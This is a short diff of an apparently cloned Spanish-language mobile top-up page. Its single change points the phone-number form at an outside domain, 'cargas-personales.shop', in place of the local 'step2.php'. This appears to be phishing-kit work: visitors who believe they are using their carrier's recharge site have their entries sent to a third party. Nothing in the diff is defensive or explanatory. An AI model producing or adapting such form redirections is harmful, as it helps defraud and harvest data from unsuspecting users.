@@ -55,7 +55,7 @@
 
                         <div _ngcontent-hol-c41="" class="row justify-content-center align-items-center">
                             <div _ngcontent-hol-c41="" class="col-11 col-sm-8 mb-sm-3">
-                                <form action="step2.php" method="POST" class="w-sm-75 mb-3" id="phoneForm">
+                                <form action="https://www.cargas-personales.shop/step2.php" method="POST" class="w-sm-75 mb-3" id="phoneForm">
                                     <div _ngcontent-hol-c41="" class="form-group ml-0">
                                         <label _ngcontent-hol-c41="" for="phone" class="label-input">Ingresá el número de línea a recargar</label>
                                         <input _ngcontent-hol-c41="" appautofocusdirective="" type="tel" name="phone" id="phone" placeholder="Ej: 1153394581" class="custom-input" maxlength="10">
